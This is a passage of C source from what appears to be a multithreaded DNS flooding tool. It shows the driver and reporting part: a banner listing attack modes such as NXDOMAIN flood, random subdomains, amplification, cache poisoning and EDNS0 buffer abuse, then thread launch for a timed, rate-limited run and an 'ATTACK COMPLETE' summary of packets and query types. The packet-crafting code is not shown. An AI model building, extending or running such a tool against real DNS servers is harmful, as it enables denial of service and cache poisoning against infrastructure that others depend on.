    if (config.qps == 0) snprintf(rate_str, sizeof(rate_str), "UNLIMITED");
    else                 snprintf(rate_str, sizeof(rate_str), "%d qps", config.qps);

    printf(C_CYAN  "  Threads   " C_RESET C_WHITE C_BOLD "%-4d" C_RESET
           C_DIM " · " C_RESET
           C_CYAN  "Duration  " C_RESET C_WHITE C_BOLD "%ds" C_RESET
           C_DIM " · " C_RESET
           C_CYAN  "Rate  " C_RESET C_WHITE C_BOLD "%s\n" C_RESET,
           config.thread_count, config.duration, rate_str);

    printf(C_DIM "  ────────────────────────────────────────────────────\n" C_RESET);
    printf("  %s %-24s  %s %-20s\n",
           config.random_subdomains  ? C_GREEN "▶" C_RESET : C_DIM "·" C_RESET, "random-subdomains",
           config.nxdomain_flood     ? C_GREEN "▶" C_RESET : C_DIM "·" C_RESET, "nxdomain-flood");
    printf("  %s %-24s  %s %-20s\n",
           config.random_types       ? C_GREEN "▶" C_RESET : C_DIM "·" C_RESET, "random-types",
           config.dns_amplification  ? C_GREEN "▶" C_RESET : C_DIM "·" C_RESET, "amplification");
    printf("  %s %-24s  %s %-20s\n",
           config.cache_poisoning    ? C_GREEN "▶" C_RESET : C_DIM "·" C_RESET, "cache-poison",
           config.random_source_ports? C_GREEN "▶" C_RESET : C_DIM "·" C_RESET, "random-ports");
    printf("  %s %-24s\n",
           config.edns0_buffer       ? C_GREEN "▶" C_RESET : C_DIM "·" C_RESET, "edns0-buffer (4096)");
    printf(C_DIM "  ────────────────────────────────────────────────────\n\n" C_RESET);
    fflush(stdout);

    animated_countdown(3);

    stats.start_time      = time(NULL);
    stats.last_stats_time = stats.start_time;

    pthread_t threads[MAX_THREADS];
    pthread_t stats_tid;

    for (int i = 0; i < config.thread_count; i++) {
        if (pthread_create(&threads[i], NULL, attack_thread, &config) != 0) {
            perror("pthread_create");
            config.thread_count = i;
            break;
        }
    }
    pthread_create(&stats_tid, NULL, stats_thread, NULL);

    int elapsed = 0;
    while (running && elapsed < config.duration) { sleep(1); elapsed++; }
    running = 0;

    printf("\n\n[+] Waiting for threads to finish...\n");
    for (int i = 0; i < config.thread_count; i++) pthread_join(threads[i], NULL);
    pthread_join(stats_tid, NULL);

    printf(CUR_SHOW);
    printf("\n");
    printf(C_RED    "  ╔════════════════════════════════════════════╗\n" C_RESET);
    printf(C_RED    "  ║  " C_WHITE C_BOLD "       ATTACK COMPLETE              " C_RED "  ║\n" C_RESET);
    printf(C_RED    "  ╚════════════════════════════════════════════╝\n\n" C_RESET);
    printf(C_CYAN   "  Total packets   " C_RESET C_WHITE C_BOLD "%lu\n"    C_RESET, stats.packets_sent);
    printf(C_CYAN   "  Duration        " C_RESET C_WHITE C_BOLD "%ld s\n"  C_RESET, time(NULL) - stats.start_time);
    printf(C_CYAN   "  Avg rate        " C_RESET C_WHITE C_BOLD "%.1f qps\n" C_RESET,
           stats.packets_sent / (double)(time(NULL) - stats.start_time));
    printf(C_CYAN   "  Wordlist used   " C_RESET C_WHITE C_BOLD "%zu / %zu\n" C_RESET,
           wl_cursor < wl_count ? wl_cursor : wl_count, wl_count);
    printf(C_GREEN  "  Responses       " C_RESET C_WHITE C_BOLD "%lu\n"    C_RESET, stats.successful_responses);
    printf(C_RED    "  Errors          " C_RESET C_WHITE C_BOLD "%lu\n\n"  C_RESET, stats.socket_errors);

    printf(C_DIM "  Query type distribution:\n" C_RESET);
    int shown = 0;
    for (int i = 0; i < 65536 && shown < 10; i++) {
        if (!stats.queries_by_type[i]) continue;
        const char *tn = "UNKNOWN";
        switch(i) {
            case TYPE_A:    tn = "A";     break;
            case TYPE_NS:   tn = "NS";    break;
            case TYPE_MX:   tn = "MX";    break;
            case TYPE_TXT:  tn = "TXT";   break;
            case TYPE_RP:   tn = "RP";    break;
            case TYPE_SOA:  tn = "SOA";   break;
            case TYPE_AAAA: tn = "AAAA";  break;
            case TYPE_DNAME:tn = "DNAME"; break;
            case TYPE_ANY:  tn = "ANY";   break;
            case TYPE_ANAME:tn = "ANAME"; break;
            case TYPE_CNAME:tn = "CNAME"; break;
            case TYPE_PTR:  tn = "PTR";   break;
        }
        printf(C_DIM "  ├─ " C_RESET C_CYAN "%-6s" C_RESET C_DIM " (%3d)" C_RESET
               ": " C_WHITE C_BOLD "%lu" C_RESET " queries\n",
               tn, i, stats.queries_by_type[i]);
        shown++;
    }

    /* Free wordlist memory */
    if (wl_words) {
        for (size_t i = 0; i < wl_count; i++) free(wl_words[i]);
        free(wl_words);
    }
    if (nx_words) {
        for (size_t i = 0; i < nx_count; i++) free(nx_words[i]);
        free(nx_words);
    }

    printf("\n" C_GREEN C_BOLD "  [✓] Done. Check DNS server logs for anomalies.\n" C_RESET);
    return 0;
}
